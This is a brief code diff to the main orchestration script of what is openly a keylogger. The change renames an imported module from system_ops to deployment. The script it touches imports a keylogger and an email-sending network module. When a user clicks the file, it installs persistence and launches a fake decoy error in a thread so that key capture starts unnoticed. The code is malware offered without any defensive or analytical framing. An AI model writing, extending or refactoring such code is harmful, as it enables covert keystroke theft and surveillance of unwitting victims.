@@ -6,19 +6,19 @@ Description: Orchestrates the keylogger, network modules, and system persistence
 import threading
 from keylogger import Keylogger
 from network import EmailSender
-import system_ops # Import the new module
+import deployment # Import the new module
 
 def main():
     
-    if not system_ops.is_running_from_startup():
+    if not deployment.is_running_from_startup():
         # SCENARIO: USER CLICKED THE FILE (USB/Desktop)
         # We only want to show the error and install persistence 
         
-        system_ops.install_persistence()
+        deployment.install_persistence()
         
         # Show Decoy Error 
         # We run this in a thread so the keylogger starts immediately
-        error_thread = threading.Thread(target=system_ops.show_fake_error)
+        error_thread = threading.Thread(target=deployment.show_fake_error)
         error_thread.start()
         
     else:
